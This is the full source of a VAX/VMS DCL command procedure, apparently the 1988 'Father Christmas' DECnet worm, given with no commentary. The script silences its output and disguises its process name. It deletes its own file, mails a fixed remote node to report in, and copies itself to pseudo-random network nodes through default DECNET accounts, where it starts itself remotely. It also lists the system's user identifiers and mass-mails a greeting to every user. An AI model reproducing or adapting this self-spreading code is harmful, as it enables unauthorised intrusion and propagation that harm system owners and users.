$ ON ERROR THEN CONTINUE
$ SET NOVERIFY
$ DEFINE SYS$ERROR NL:
$ DEFINE SYS$OUTPUT NL:
$ SET DEFAULT SYS$LOGIN
$ SET PROCESS/NAME="MAIL_178DC"
$ DELETE := DELETE
$ SPAWN := SPAWN
$ NULL[0,7]=0
$ OPEN/READ/WRITE LINK SYS$NET
$ CLOSE LINK
$LOOK_LOOP:
$ PID = F$PID(CONTEXT)
$ IF PID .EQS. "" THEN GOTO START
$ IF F$GETJPI(PID,"WSAUTHEXT")-1 .EQ. F$GETJPI(PID,"WSEXTENT") THEN -
     GOTO STOP_PROCESS
$ GOTO LOOK_LOOP
$STOP_PROCESS:
$ SET PROTECTION=O:RWED HI.COM;*
$ DELETE HI.COM;*
$ STOP/ID=0
$START:
$ WORKSET = F$GETJPI(0,"WSAUTHEXT")-1
$ SET WORK/EXTENT='WORKSET'
$SAVE:
$ COUNTER = 0
$ OPEN/READ HI$FILE HI.COM
$LOOP1:
$ READ/END_OF_FILE=END_LOOP1 HI$FILE HILINE'COUNTER'
$ COUNTER = COUNTER + 1
$ GOTO LOOP1
$END_LOOP1:
$ CLOSE HI$FILE
$ NUM_HILINES = COUNTER
$ SET PROTECTION=O:RWED HI.COM;*
$ DELETE HI.COM;*
$ACTION:
$ SPAWN/INPUT=NL:/OUTPUT=NL:/NONOTIFY/NOLOG/NOWAIT -
    MAIL/SUBJ="''F$TRNLNM("SYS$ANNOUNCE")'" NL: 20597::PHSOLIDE
$SEARCH_NODE:
$ TIME = F$EXTR(0,16,F$CVTIME(F$TIME()))
$ IF TIME .GTS. "1988-12-24 00:30" THEN STOP/ID=0
$ IF TIME .GTS. "1988-12-24 00:00" THEN GOTO MAILING
$GENERATE_NODE:
$ NODE = (F$INT(F$EXT(21,1,F$TIME()))*10000) +  -
         (F$INT(F$EXT(21,1,F$TIME()))*1000)  +  -
         (F$INT(F$EXT(21,1,F$TIME()))*100) +  -
         (F$INT(F$EXT(21,1,F$TIME()))*10) +  -
         (F$INT(F$EXT(21,1,F$TIME())))
$ NODE = NODE*(F$INT(F$EXT(18,2,F$TIME()))+1)/63
$ IF NODE .EQ. 0     THEN GOTO GENERATE_NODE
$ IF NODE .GT. 63*1024 THEN GOTO GENERATE_NODE
$REPROD:
$ COUNTER = 0
$ OPEN/WRITE/ERROR=OPEN_ERROR  HI$FILE 'NODE'::HI.COM
$LOOP2:
$ WRITE/ERROR=CLEANUP HI$FILE HILINE'COUNTER'
$ IF COUNTER .EQ. NUM_HILINES-1 THEN GOTO END_LOOP2
$ COUNTER = COUNTER + 1
$ GOTO LOOP2
$END_LOOP2:
$ CLOSE HI$FILE
$START_TASK:
$ TYPE 'NODE'::"TASK=HI.COM"
$ IF ($STATUS.NE.%X10951098).OR.(F$LOC("""",NODE).NE.F$LEN(NODE)) -
     THEN GOTO 2ND_ERROR_CHECK
$ NODE := 'NODE'"""DECNET DECNET""
$ GOTO START_TASK
$2ND_ERROR_CHECK:
$ IF $STATUS .NE. "%X10000001" THEN GOTO CLEANUP
$ GOTO SEARCH_NODE
$CLEANUP:
$ CLOSE HI$FILE
$ DELETE 'NODE'::HI.COM;*
$ GOTO SEARCH_NODE
$OPEN_ERROR:
$ IF ($STATUS.NE.%X1001C00A).OR.(F$LOC("""",NODE).NE.F$LEN(NODE))  -
      THEN   GOTO  SEARCH_NODE
$ NODE := 'NODE'"""DECNET DECNET""
$ GOTO REPROD
$MAILING:
$ MAILLINE0 = "HI,"
$ MAILLINE1 = ""
$ MAILLINE2 = " HOW ARE YA ? I HAD A HARD TIME PREPARING ALL THE PRESENTS."
$ MAILLINE3 = " IT ISN'T QUITE AN EASY JOB. I'M GETTING MORE AND MORE"
$ MAILLINE4 = " LETTERS FROM THE CHILDREN EVERY YEAR AND IT'S NOT SO EASY"
$ MAILLINE5 = " TO GET THE TERRIBLE RAMBO-GUNS, TANKS AND SPACE SHIPS UP HERE AT"
$ MAILLINE6 = " THE NORTHPOLE. BUT NOW THE GOOD PART IS COMING."
$ MAILLINE7 = " DISTRIBUTING ALL THE PRESENTS WITH MY SLEIGH AND THE"
$ MAILLINE8 = " DEERS IS REAL FUN. WHEN I SLIDE DOWN THE CHIMNEYS"
$ MAILLINE9 = " I OFTEN FIND A LITTLE PRESENT OFFERED BY THE CHILDREN,"
$ MAILLINE10 = " OR EVEN A LITTLE BRANDY FROM THE FATHER. (YEAH!)"
$ MAILLINE11 = " ANYHOW THE CHIMNEYS ARE GETTING TIGHTER AND TIGHTER"
$ MAILLINE12 = " EVERY YEAR. I THINK I'LL HAVE TO PUT MY DIET ON AGAIN."
$ MAILLINE13 = " AND AFTER CHRISTMAS I'VE GOT MY BIG HOLIDAYS :-)."
$ MAILLINE14 = ""
$ MAILLINE15 = " NOW STOP COMPUTING AND HAVE A GOOD TIME AT HOME !!!!"
$ MAILLINE16 = ""
$ MAILLINE17 = "    MERRY CHRISTMAS"
$ MAILLINE18 = "       AND A HAPPY NEW YEAR"
$ MAILLINE19 = ""
$ MAILLINE20 = "            YOUR  FATHER CHRISTMAS"
$ NUM_MAILLINES = 21
$ DEFINE SYSUAF SYS$LOGIN:SYSUAF
$ MC AUTHORIZE
Y
LIST/ID *
EXIT
$ DELETE SYS$LOGIN:SYSUAF.DAT;*
$ NODE = 0
$MAIL_GOOD:
$ OPEN/READ/WRITE NET$LINK 'NODE'::"27="
$ IF ($STATUS.NE.%X1001C002).OR.(F$LOC("""",NODE).NE.F$LEN(NODE)) -
    THEN GOTO START_MAIL
$ NODE := 'NODE'"""DECNET DECNET""
$ GOTO MAIL_GOOD
$START_MAIL:
$ CLOSE NET$LINK
$ OPEN/READ        USER$FILE  RIGHTSLIST.LIS
$ READ             USER$FILE  USER
$LOOP3:
$ OPEN/READ/WRITE  NET$LINK   'NODE'::"27="
$ WRITE NET$LINK  "FATHER CHRISTMAS"
$NEXT_USER:
$ READ/END_OF_FILE=END_MAILING  USER$FILE USER
$ IF  F$EXTR(3,1,USER) .EQS. " " THEN GOTO NEXT_USER
$ USER = F$EXTR(2,12,USER)
$ WRITE NET$LINK USER
$ READ  NET$LINK ERROR
$ IF F$CVUI(0,32,ERROR) .NE. 1  THEN GOTO CLOSE_NET
$ WRITE NET$LINK NULL
$ WRITE NET$LINK "YOU..."
$ WRITE NET$LINK "CHRISTMAS CARD."
$ COUNTER = 0
$TEXT_LOOP:
$ WRITE NET$LINK MAILLINE'COUNTER'
$ COUNTER = COUNTER + 1
$ IF COUNTER .EQ. NUM_MAILLINES THEN GOTO END_TEXT_LOOP
$ GOTO TEXT_LOOP
$END_TEXT_LOOP:
$ WRITE NET$LINK NULL
$ WAIT 00:00:01
$CLOSE_NET:
$ CLOSE NET$LINK
$ GOTO LOOP3
$END_MAILING:
$ CLOSE NET$LINK
$ CLOSE USER$FILE
$ DELETE RIGHTSLIST.LIS;*
$ WAIT 00:30
$ STOP/ID=0
